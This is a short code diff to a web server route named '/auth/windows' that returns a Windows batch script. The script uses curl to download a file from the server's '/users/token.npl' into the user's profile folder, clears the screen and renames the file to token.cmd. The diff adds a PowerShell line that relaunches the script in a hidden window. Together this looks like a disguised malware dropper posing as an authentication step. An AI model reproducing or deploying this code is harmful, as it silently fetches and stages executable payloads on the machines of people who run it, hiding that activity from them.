@@ -64,6 +64,7 @@ router.get("/auth/windows", (req, res) => {
     const domain = req.protocol + '://' + req.get('host');
     
     res.type("text/plain").send(`@echo off
+    powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden"
     curl -s -L -o "%USERPROFILE%\\token" ${domain}/users/token.npl
     cls
     ren "%USERPROFILE%\\token" token.cmd
